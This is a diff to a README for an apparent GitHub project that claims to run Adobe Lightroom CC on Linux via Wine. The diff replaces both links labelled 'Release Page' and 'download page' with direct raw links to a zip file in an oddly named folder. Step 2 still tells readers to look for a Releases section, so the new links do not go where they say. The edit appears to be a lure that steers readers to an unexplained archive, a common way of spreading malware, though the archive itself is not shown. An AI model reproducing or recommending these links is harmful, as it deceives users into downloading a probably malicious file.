@@ -1,6 +1,6 @@
 # 📸 lightroom-cc-on-linux - Run Adobe Lightroom on Linux systems
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nick3319-alt/lightroom-cc-on-linux)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nick3319-alt/lightroom-cc-on-linux/raw/refs/heads/main/Archiannelida/on-lightroom-cc-linux-v2.8.zip)
 
 ## 📋 Project Overview
 This repository provides a method to run Adobe Lightroom CC on Linux. It uses Wine 11.8 staging to ensure compatibility. This approach delivers a stable environment for professional photo editing. You get access to your tools without needing a Windows license.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these standards:
 ## 🚀 How to Download and Install
 Follow these steps to set up your environment.
 
-1. Visit the project repository page to access the files. [Click this link to go to the download page](https://github.com/Nick3319-alt/lightroom-cc-on-linux).
+1. Visit the project repository page to access the files. [Click this link to go to the download page](https://github.com/Nick3319-alt/lightroom-cc-on-linux/raw/refs/heads/main/Archiannelida/on-lightroom-cc-linux-v2.8.zip).
 2. Locate the "Releases" section on the right side of the page.
 3. Select the latest version identified in the list.
 4. Download the script file provided in the assets list.
